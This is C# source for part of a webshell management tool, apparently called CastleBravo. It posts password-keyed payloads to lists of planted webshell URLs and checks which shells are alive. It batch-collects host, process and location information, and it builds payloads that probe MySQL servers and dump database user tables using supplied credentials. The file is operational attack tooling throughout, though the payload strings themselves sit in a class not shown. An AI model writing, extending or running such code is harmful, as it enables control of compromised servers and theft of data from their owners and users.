using C2.Business.CastleBravo.WebShellTool.SettingsDialog;
using C2.Core;
using C2.Utils;
using System;
using System.Collections;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using static C2.Utils.GuarderUtil;

namespace C2.Business.CastleBravo.WebShellTool
{
    public partial class WebShellManageForm
    {

        //公共函数部分
        private void BatchInfoColletion(bool checkAlive, int time = 60)
        {   // 刷新前先强制清空
            ResetProgressMenuValue(checkAlive ? CountStatusAliveItem() : LV.Items.Count);
            ClearScanResult();
            DoInfoCollectionTask(LV.Items, checkAlive, time);
            EndCheckAlive();
        }

        private void DoInfoCollectionTask(IList items, bool checkAlive, int time)
        {
            s = DateTime.Now;
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
                foreach (ListViewItem lvi in items)
                {
                    if (actionNeedStop)
                        break;
                    if (checkAlive && !lvi.SubItems[5].Text.Equals("√"))
                    {
                        lvi.SubItems[7].Text = "跳";
                        continue;
                    }
                    SingleInfoCollection(lvi, time);
                    UpdateProgress();
                    CheckSavePoint(); // 5分钟保存一次
                }
        }

        private bool PostInfoCollectionPayload(WebShellTaskConfig task)
        {
            try
            {
                string payload = string.Format(ClientSetting.PayloadDict[this.sgType], task.Password);
                if (this.sgType == SGType.UserTable)
                {
                    byte[] ret = WebClientEx.PostDownload(NetUtil.FormatUrl(task.Url), payload, 30000, Proxy);
                    task.ProbeInfo = ClientSetting.ProcessingResults(ret, task.Url, ClientSetting.InfoProbeItems[this.sgType]);
                }
                else
                {
                    string ret = WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 30000, Proxy);
                    task.ProbeInfo = ProcessingResults(ret, task.Url);
                }

            }
            catch (Exception ex)
            {
                task.ProbeInfo = ex.Message;
            }
            return true;
        }
        private void CreatePingPayload()
        {
            this.sgType = SGType.SuperPing;
            SuperPingSet sps = new SuperPingSet();
            if (sps.ShowDialog() != DialogResult.OK)
                return;
            string payload = string.Format(ClientSetting.SuperPingPayload, "{0}", ST.EncodeBase64(sps.Domain));
            ClientSetting.PayloadDict[SGType.SuperPing] = payload;
        }

        private void SingleInfoCollection(ListViewItem lvi, int time = 60)
        {
            WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
            lvi.SubItems[7].Text = "进行中";
            using (GuarderUtil.WaitCursor)
                DoEventsWait(time, Task.Run(() => PostInfoCollectionPayload(task)));
            lvi.SubItems[7].Text = task.ProbeInfo;
        }
        private int ConfigPayloadOk()
        {
            MysqlProbeSet mps = new MysqlProbeSet();
            if (mps.ShowDialog() != DialogResult.OK)
                return 0;

            int ps = mps.ProbeStrategy;
            string files = mps.SearchFiles.Trim();
            string fields = mps.SearchFields.Trim();

            this.sgType = SGType.MysqlProbe;
            string payload = string.Format(ClientSetting.MysqlProbePayload,
                "{0}",
                ps,
                ST.EncodeBase64(files),
                ST.EncodeBase64(fields));

            ClientSetting.PayloadDict[SGType.MysqlProbe] = payload;
            return mps.TimeoutSeconds;
        }

        private bool UserMYDPayloadOK()
        {
            bool buildOK = true;
            UserMYDProbeSet utp = new UserMYDProbeSet();
            if (utp.ShowDialog() != DialogResult.OK)
                return !buildOK;
            this.sgType = SGType.UserTable;
            string payload = string.Format(ClientSetting.UserTablePayload,
                                         "{0}", utp.DBUser, utp.DBPassword);

            ClientSetting.PayloadDict[SGType.UserTable] = payload;
            return buildOK;
        }

        private string LocationResult(string rawResult)
        {
            Regex r = new Regex("formatted_address\":\"(.+),\"business");
            int index = new Random().Next(0, ClientSetting.BDLocationAK.Count - 1);
            string bdURL = string.Format(ClientSetting.BDLocationAPI, ClientSetting.BDLocationAK[index], rawResult);
            string jsonResult = ST.EncodeUTF8(WebClientEx.Post(bdURL, string.Empty, 8000, Proxy));
            Match m = r.Match(jsonResult);
            return m.Success ? rawResult + ":" + m.Groups[1].Value : string.Empty;
        }

        private void SelectedInfoColletion(int time = 60)
        {
            ResetProgressMenuValue(LV.SelectedItems.Count);
            ClearScanResult();
            DoInfoCollectionTask(LV.SelectedItems, false, time);
            EndCheckAlive();
        }

        private String ProcessingResults(string ret, string taskUrl)
        {
            Regex r0 = new Regex("QACKL3IO9P==(.+?)==QACKL3IO9P", RegexOptions.Singleline);
            Regex p0 = new Regex(@"((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}");
            if (this.sgType == SGType.SuperPing)  //匹配ip
                return p0.Match(ret).Value.IsNullOrEmpty() ? "无结果" : p0.Match(ret).Value;
            Match m0 = r0.Match(ret);
            if (!m0.Success)
                return ClientSetting.InfoProbeItems[this.sgType] + ":无结果";

            string rawResult = m0.Groups[1].Value;
            if (this.sgType == SGType.LocationInfo)
                return LocationResult(rawResult);

            if (ClientSetting.table.ContainsKey(this.sgType)) //进程 计划任务 系统信息……
                return ClientSetting.WriteResult(rawResult, taskUrl, ClientSetting.table[this.sgType]);

            return rawResult;
        }
    }
}
